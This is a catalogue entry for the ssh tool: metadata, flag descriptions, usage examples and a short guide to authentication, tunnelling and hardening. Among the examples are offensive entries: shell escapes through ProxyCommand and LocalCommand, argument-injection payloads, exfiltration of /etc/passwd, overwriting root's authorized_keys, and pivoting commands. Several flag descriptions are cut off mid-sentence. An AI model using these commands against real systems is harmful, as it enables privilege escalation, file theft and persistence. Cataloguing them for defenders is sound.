---
id: network-remote-ssh
namespace: network:remote:ssh
name: ssh
description: Secure Shell protocol for encrypted remote login, command execution,
  and file transfer.
author: "Repository Maintainers"
version: "1.0.0"
capabilities:
  - network.remote.shell
  - security.authentication.key
  - security.authentication.password
  - network.remote.tunnel
  - network.remote.filetransfer
  - network.remote.forward
  - network.remote.execute
  - network.transfer.download
  - network.transfer.upload
  - security.execution.command
  - security.privilege-escalation.shell
  - system.file.read
platforms:
  - linux
  - macos
  - cross-platform
risk_level: medium
trust_level: verified
execution_policy: enabled
architectures:
  - amd64
  - arm64
  - cross-platform
dependencies: []
related_tools:
  - sshfs
  - autossh
  - rsync
  - scp
  - mosh
  - network-transfer-scp
  - network-transfer-sftp
  - system-sync-rsync
artifacts:
  - type: network.remote.session
    description: Established SSH session
    trust_level: verified
  - type: network.remote.output
    description: Output from remote command execution
    mime: text/plain
    trust_level: verified
  - type: security.key.ssh.private
    description: SSH private key
    trust_level: verified
  - type: security.key.ssh.public
    description: SSH public key
    trust_level: verified
workflow_edges:
  produces:
    - remote-output
    - ssh-session
  consumes:
    - remote-host
    - ssh-key
contract:
  inputs:
    - type: network.target.host
      description: Remote hostname or IP address
    - type: security.key.ssh.private
      description: SSH private key for authentication
  outputs:
    - type: network.remote.output
      description: Output from remote command execution
      mime: text/plain
  side_effects:
    - network_traffic
    - process_spawn
  resource_cost:
    cpu: low
    memory_mb: 16
    network: low
    disk_io: low
resource_profile:
  cpu: low
  memory_mb: 16
  network: low
  disk_io: low
allowed-tools:
  - ssh
  - Bash
  - execFile

parameters:
  - name: flag-4
    type: string
    required: false
    description: "Forces ssh to use IPv4 addresses only"
    aliases:
      - "-4"
  - name: flag-6
    type: string
    required: false
    description: "Forces ssh to use IPv6 addresses only"
    aliases:
      - "-6"
  - name: flag-a
    type: string
    required: false
    description: "Disables forwarding of the authentication agent connection"
    aliases:
      - -a
  - name: flag-B
    template_key: flag-b
    type: string
    required: false
    description: "Bind to the address of bind_interface before attempting to con-
      nect to the destination host. This is only useful on systems with more than
      one address"
    aliases:
      - -B
  - name: flag-b
    type: string
    required: false
    description: "Use bind_address on the local machine as the source address of the
      connection. Only useful on systems with more than one ad- dress"
    aliases:
      - -b
  - name: flag-c
    type: array
    required: false
    description: "Selects the cipher specification for encrypting the session. cipher_spec
      is a comma-separated list of ciphers listed in order of preference. See the
      Ciphers keyword in ssh_config(5) for more inform..."
    aliases:
      - -c
  - name: flag-D
    template_key: flag-d
    type: string
    required: false
    description: "Specifies a local \"dynamic\" application-level port forwarding.
      This works by allocating a socket to listen to port on the local side, optionally
      bound to the specified bind_address. Whenever a co..."
    aliases:
      - -D
  - name: flag-E
    template_key: flag-e
    type: string
    required: false
    description: "Append debug logs to log_file instead of standard error"
    aliases:
      - -E
  - name: flag-e
    type: string
    required: false
    default_value: "~"
    description: "Sets the escape character for sessions with a pty . The escape character
      is only recognized at the beginning of a line. The escape character followed
      by a dot (`.') closes the connection; followed ..."
    aliases:
      - -e
  - name: flag-F
    template_key: flag-f
    type: string
    required: false
    description: "Specifies an alternative per-user configuration file. If a con-
      figuration file is given on the command line, the system-wide configuration
      file (/etc/ssh/ssh_config) will be ignored. The default f..."
    aliases:
      - -F
  - name: flag-f
    type: string
    required: false
    description: "Requests ssh to go to background just before command execution"
    aliases:
      - -f
  - name: flag-g
    type: string
    required: false
    description: "Allows remote hosts to connect to local forwarded ports. If"
    aliases:
      - -g
  - name: flag-I
    template_key: flag-i
    type: string
    required: false
    description: "Specify the PKCS#11 shared library ssh should use to communicate
      with a PKCS#11 token providing keys for user authentication"
    aliases:
      - -I
  - name: flag-i
    type: file
    required: false
    description: "Selects a file from which the identity (private key) for public
      key authentication is read. You can also specify a public key file to use the
      corresponding private key that is loaded in ssh-agent(1..."
    aliases:
      - -i
  - name: flag-J
    template_key: flag-j
    type: string
    required: false
    description: "Connect to the target host by first making an ssh connection to
      the jump host described by destination and then establishing a TCP forwarding
      to the ultimate destination from there. Multiple jump h..."
    aliases:
      - -J
  - name: flag-k
    type: string
    required: false
    description: "Disables forwarding (delegation) of GSSAPI credentials to the"
    aliases:
      - -k
  - name: flag-L
    template_key: flag-l
    type: string
    required: false
    description: "[bind_address:]port:remote_socket -L local_socket:host:hostport
      -L local_socket:remote_socket Specifies that connections to the given TCP port
      or Unix socket on the local (client) host are to be fo..."
    aliases:
      - -L
  - name: flag-l
    type: string
    required: false
    description: "Specifies the user to log in as on the remote machine. This also
      may be specified on a per-host basis in the configuration file"
    aliases:
      - -l
  - name: flag-m
    type: array
    required: false
    description: "A comma-separated list of MAC (message authentication code) al-
      gorithms, specified in order of preference. See the MACs key- word in ssh_config(5)
      for more information"
    aliases:
      - -m
  - name: flag-n
    type: string
    required: false
    description: "Redirects stdin from /dev/null (actually, prevents reading from"
    aliases:
      - -n
  - name: flag-O
    template_key: flag-o
    type: string
    required: false
    description: "Control an active connection multiplexing master process. When the
      -O option is specified, the ctl_cmd argument is interpreted and passed to the
      master process. Valid commands are: \"check\" (check..."
    aliases:
      - -O
  - name: flag-o
    type: string
    required: false
    description: "Can be used to give options in the format used in the configura-
      tion file. This is useful for specifying options for which there is no separate
      command-line flag. For full details of the options l..."
    aliases:
      - -o
  - name: flag-P
    template_key: flag-p
    type: string
    required: false
    description: "ssh_config(5). Refer to the Tag and Match keywords in ssh_config(5)
      for more information. -p port Port to connect to on the remote host. This can
      be specified on a per-host basis in the configurati..."
    aliases:
      - -P
  - name: flag-Q
    template_key: flag-q
    type: string
    required: false
    description: "Queries for the algorithms supported by one of the following features:
      cipher (supported symmetric ciphers), cipher-auth (supported symmetric ciphers
      that support authenticated encryp- tion), help ..."
    aliases:
      - -Q
  - name: flag-q
    type: string
    required: false
    description: "Quiet mode. Causes most warning and diagnostic messages to be"
    aliases:
      - -q
  - name: flag-R
    template_key: flag-r
    type: string
    required: false
    description: "[bind_address:]port:local_socket -R remote_socket:host:hostport
      -R remote_socket:local_socket -R [bind_address:]port Specifies that connections
      to the given TCP port or Unix socket on the remote (s..."
    aliases:
      - -R
  - name: flag-S
    template_key: flag-s
    type: string
    required: false
    description: "Specifies the location of a control socket for connection shar-
      ing, or the string \"none\" to disable connection sharing. Refer to the description
      of ControlPath and ControlMaster in ssh_config(5)..."
    aliases:
      - -S
  - name: flag-s
    type: string
    required: false
    description: "May be used to request invocation of a subsystem on the remote"
    aliases:
      - -s
  - name: flag-t
    type: string
    required: false
    description: "Force pseudo-terminal allocation. This can be used to execute"
    aliases:
      - -t
  - name: flag-t-2
    type: string
    required: false
    description: "Set the flag-t-2 parameter"
    aliases:
      - -t
techniques:
  - command-and-control
  - remote-services
  - credential-access
  - lateral-movement
  - execution
  - collection
  - exfiltration
  - privilege-escalation
execution:
  template: "ssh {flag-4} {flag-6} {flag-a} {flag-b} {flag-b}"
  sandbox: execFile
  timeout_seconds: 60
  shell: false
global_vars:
  target: ip
  user: user
  port: port
examples:
  - description: "Connect to a remote server"
    command: "ssh user@example.com"
  - description: "Execute a remote command non-interactively"
    command: "ssh user@example.com 'uname -a && df -h'"
  - description: "Connect with a specific identity file"
    command: "ssh -i ~/.ssh/deploy_key -p 2222 user@example.com"
  - description: "Create a local port forward tunnel"
    command: "ssh -L 8080:localhost:80 user@bastion.example.com"
  - description: Spawn interactive shell on client. Does not require a successful
      connection.
    command: "ssh -o ProxyCommand=';sh 0<&2 1>&2' host\n"
  - description: Spawn interactive shell on client. Requires a successful connection
      towards `host`.
    command: "ssh -o PermitLocalCommand=yes -o LocalCommand=/bin/sh host\n"
  - description: Sends a local file (`/etc/passwd`) to a remote SSH server and saves
      it in a location (`/tmp/out`).
    command: "ssh host \"cat /tmp/out\" < /etc/passwd\n"
  - description: Retrieves a remote file from an SSH server (`/tmp/infile`) and saves
      it to a local destination (`/root/.ssh/authorized_keys`).
    command: "ssh host \"cat /tmp/infile\" > /root/.ssh/authorized_keys\n"
  - description: Reads a file and outputs it in an error message.
    command: "ssh -F /etc/passwd host\n"
  - description: Execute specified command, can be used for defense evasion.
    command: ssh localhost "{CMD}"
  - description: Performs execution of specified file, can be used as a defensive
      evasion.
    command: ssh -o ProxyCommand="{CMD}" .
  - description: 'Argument injection: spawn interactive shell: Spawn interactive shell
      on client. Does not require a successful connection.'
    command: ssh -o ProxyCommand=';sh 0<&2 1>&2' host
  - description: 'Argument injection: spawn interactive shell: Spawn interactive shell
      on client. Requires a successful connection towards `host`.'
    command: ssh -o PermitLocalCommand=yes -o LocalCommand=/bin/sh host
  - description: 'Argument injection: upload file: Sends a local file (`/etc/passwd`)
      to a remote SSH server and saves it in a location (`/tmp/out`).'
    command: ssh host "cat /tmp/out" < /etc/passwd
  - description: 'Argument injection: download file: Retrieves a remote file from
      an SSH server (`/tmp/infile`) and saves it to a local destination (`/root/.ssh/authorized_keys`).'
    command: ssh host "cat /tmp/infile" > /root/.ssh/authorized_keys
  - description: 'Argument injection: read local file: Reads a file and outputs it
      in an error message.'
    command: ssh -F /etc/passwd host
  - description: 'Argument injection: execute arbitrary command: Does not require
      a successful connection.'
    command: ssh -o ProxyCommand=';uname -a 1>&2' host
  - description: 'Darkiros PIVOTING: SSH - dynamic port forwarding over socks'
    command: ssh -D [local_port] [user]@[ip]
  - description: 'Darkiros PIVOTING: SSH - port forwarding'
    command: ssh -L [local_port]:[remote_ip]:[remote_port] [user]@[ip]
  - description: NetRunners Active Directory/enumeration
    command: ssh {{USER}}@{{IP}}
  - description: NetRunners Active Directory/enumeration
    command: ssh {{USER}}@{{IP}} -i id_rsa
  - description: NetRunners KERBEROS/enumeration
    command: ssh {{USER}}@{{IP}}
  - description: NetRunners KERBEROS/enumeration
    command: ssh {{USER}}@{{IP}} -i id_rsa
  - description: SSH in via PEM file, which normally needs 0600 permissions.
    command: ssh -i /path/to/file.pem user@example.com
  - description: Connect through a non-standard port. It's recommended not to use
      the default port of 22, as it is so often targeted, due to it being so commonplace.
    command: ssh -p 2222 user@example.com
  - description: Connect and forward the authentication agent.
    command: ssh -A user@example.com
  - description: Execute a command on a remote server.
    command: ssh -t user@example.com 'the-remote-command'
  - description: Tunnel an X session over SSH, via X11 Forwarding.
    command: ssh -X user@example.com
  - description: Redirect traffic with a tunnel between local host (port 8080) and
      a remote host (remote.example.com:5000) through a proxy (personal.server.com).
    command: ssh -f -L 8080:remote.example.com:5000 user@personal.server.com -N
  - description: Launch a specific X application over SSH.
    command: ssh -X -t user@example.com 'chromium-browser'
  - description: Create a SOCKS proxy on localhost and port 9999.
    command: ssh -D 9999 user@example.com
  - description: 'Connect to server, but allow for X11 forwarding, while also using
      Gzip compression (can be much faster; YMMV), and using the `blowfish` encryption.
      For more information, see: http://unix.stackexchange.com/q/12755/44856'
    command: ssh -XCc blowfish user@example.com
  - description: Copy files and directories, via SSH, from remote host to the current
      working directory, with Gzip compression. An option for when `rsync` isn't available.
      This works by creating (not temporary!) a remote Tar archive, then piping its
      output to a local Tar process, which then extracts it to STDOUT.
    command: ssh user@example.com 'tar -C /var/www/Shared/ zcf - asset1 asset2' |
      tar zxf -
  - description: Explicitly specify a key for connection. Useful if you have too many
      authentication failures for a given username.
    command: ssh -i some_id_rsa -o IdentitiesOnly=yes them@there:/path/
  - description: Temporarily disable `pubkey` authentication for this instance.
    command: ssh -o PubkeyAuthentication=no username@hostname.com
  - description: 'Mount a remote directory or filesystem, through SSH, to a local
      mount point. Install SSHFS from: https://github.com/libfuse/sshfs'
    command: sshfs name@server:/path/to/folder /path/to/mount/point
  - description: EMACS can read files through SSH. Below, is a link to related documentation.
      http://www.gnu.org/software/emacs/manual/html_node/emacs/Remote-Files.html
    command: emacs /ssh:name@server:/path/to/file
  - description: Get help for SSH escape sequences. Useful for terminating unresponsive
      sessions. The default escape character is ~ (tilde), escapes are only recognized
      immediately after a newline.
    command: $ <Enter>~?
references:
  - label: "OpenSSH documentation"
    url: "https://www.openssh.com/manual.html"
  - label: "SSH Academy"
    url: "https://www.ssh.com/academy/ssh"
mitre_ids:
  - T1202
contributor: Akshat Pradhan
phase: enumeration
features:
  - output-json
  - network-intensive
  - file-system
  - process-manip
detections:
  - type: sigma
    url: 
      https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/process_creation/proc_creation_win_lolbin_ssh.yml
  - type: ioc
    description: Event ID 4624 with process name C:\Windows\System32\OpenSSH\sshd.exe.
  - type: ioc
    description: command line arguments specifying execution.
---

# SSH — Secure Shell

SSH (Secure Shell) is the standard protocol for encrypted remote administration and secure communication over an unsecured network. It provides strong authentication, encrypted data transfer, and extensive tunneling capabilities.

## Authentication Methods

### Password Authentication
```bash
ssh user@host
# prompts for password
```

### Key-Based Authentication (Recommended)
```bash
# Generate a key pair
ssh-keygen -t ed25519 -C "user@example.com"

# Copy public key to remote host
ssh-copy-id user@example.com

# Connect using the key
ssh user@example.com
```

## Port Forwarding

SSH tunneling allows secure forwarding of network connections:

### Local Forwarding (incoming to local)
```bash
ssh -L 8080:localhost:80 gateway.example.com
# Access http://localhost:8080 on local machine
```

### Remote Forwarding (local to remote)
```bash
ssh -R 9000:localhost:3000 gateway.example.com
# Remote host can connect to localhost:9000 → local port 3000
```

### Dynamic Forwarding (SOCKS proxy)
```bash
ssh -D 1080 user@gateway.example.com
# Configure browser to use SOCKS5 proxy at localhost:1080
```

## Security Best Practices

```bash
# Disable password authentication
# Edit /etc/ssh/sshd_config:
# PasswordAuthentication no
# PubkeyAuthentication yes

# Use non-standard port to reduce scan attacks
# Port 2222

# Limit users who can SSH
# AllowUsers deploy admin

# Use 2FA where available
```

## Related Tools

- **[ssh-keygen](../../crypto/ssh-keygen.md)** — SSH key generation and management
- **[ssh-copy-id](../../remote/ssh-copy-id.md)** — Install public key on remote host
- **[scp](../../remote/scp.md)** — Secure file copy over SSH
- **[rsync](../../sync/rsync.md)** — Efficient file synchronization over SSH
